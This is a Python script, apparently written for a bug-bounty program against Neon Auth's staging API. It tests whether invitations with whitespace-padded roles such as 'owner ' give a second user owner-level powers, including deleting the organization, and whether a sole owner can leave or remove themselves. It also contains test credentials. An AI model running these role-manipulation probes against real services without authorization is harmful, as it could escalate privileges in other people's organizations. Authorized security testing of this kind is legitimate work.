# -*- coding: utf-8 -*-
"""V9b: role whitespace trim consistency - invite role='owner ' stored as?
Accept it -> DB member.role value + actual permission check (can U2 act as owner?)
Also single-owner leave / self-remove / dual-owner leave state machine."""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.5)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.5)
        return None, str(e)[:150], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    uri = data.get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql)
            if cur.description is None:
                return None
            return cur.fetchall()


def mid(org, email):
    r = dbq('SELECT m.id FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
            'WHERE m."organizationId"=%s AND u.email=%s' % ("'" + org + "'", "'" + email + "'"))
    return str(r[0][0]) if r else None


def main():
    out("== V9b trim consistency + owner edge ==")
    fetch_db_uri()
    c1, c2 = auth(U1), auth(U2)
    out("sessions: %s" % [bool(c1), bool(c2)])
    if not (c1 and c2):
        return
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v9b-org", "slug": "v9b-%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return

    # T1: unique fresh emails per role variant (unregistered emails ok for invite?)
    for idx, rv in enumerate(["owner ", " member", "OWNER ", "admin ", "member ", "\towner", "owner\t"]):
        em = "libobo1229+v9b%d@gmail.com" % idx
        st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                      {"organizationId": org, "email": em, "role": rv}, c1)
        out("T1 invite %-10r to %-28s -> %d %s" % (rv, em, st, d[:90]))
        r = dbq('SELECT email, role, status FROM neon_auth.invitation WHERE email=%s'
                % ("'" + em + "'"))
        out("      db: %s" % [(x[0], repr(x[1]), x[2]) for x in r])

    # T2: the interesting one - U2 invited with role='owner ' then accept
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": U2, "role": "owner "}, c1)
    out("T2 invite U2 role='owner ' -> %d %s" % (st, d[:130]))
    r = dbq('SELECT id, role FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
            'AND status=%s' % ("'" + org + "'", "'" + U2 + "'", "'pending'"))
    out("   invitation db role: %r" % (r[0][1] if r else None))
    i2 = str(r[0][0]) if r else None
    if i2:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": i2}, c2)
        out("   U2 accept -> %d %s" % (st, d[:120]))
        r2 = dbq('SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
                 'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))
        out("   members now: %s" % [(x[0], repr(x[1])) for x in r2])
        # actual permission: can U2 (role='owner '?) invite others as owner?
        st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                      {"organizationId": org, "email": "libobo1229+v9z@gmail.com",
                       "role": "member"}, c2)
        out("   U2 invite perm check -> %d %s" % (st, d[:120]))
        # can U2 delete org? (owner-only)
        st, d, _ = na("POST", "/neondb/auth/organization/delete",
                      {"organizationId": org}, c2)
        out("   U2 delete perm check -> %d %s" % (st, d[:120]))

    # T3: single-owner leave / self-remove (U1 still owner unless U2 escalated)
    st, d, _ = na("POST", "/neondb/auth/organization/leave",
                  {"organizationId": org}, c1)
    out("T3 single-owner U1 leave -> %d %s" % (st, d[:130]))
    m1 = mid(org, U1)
    st, d, _ = na("POST", "/neondb/auth/organization/remove-member",
                  {"organizationId": org, "memberIdOrEmail": m1}, c1)
    out("T4 single-owner self-remove -> %d %s" % (st, d[:130]))

    # cleanup
    rem = dbq('SELECT u.email FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
              'WHERE m."organizationId"=%s AND m.role=\'owner\'' % ("'" + org + "'"))
    ck_owner = c1
    if rem and rem[0][0] == U2:
        ck_owner = c2
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, ck_owner)
    out("cleanup delete org -> %d %s" % (st, d[:80]))
    dbq('DELETE FROM neon_auth.invitation WHERE "organizationId"=%s' % ("'" + org + "'"))
    out("done")


if __name__ == "__main__":
    main()
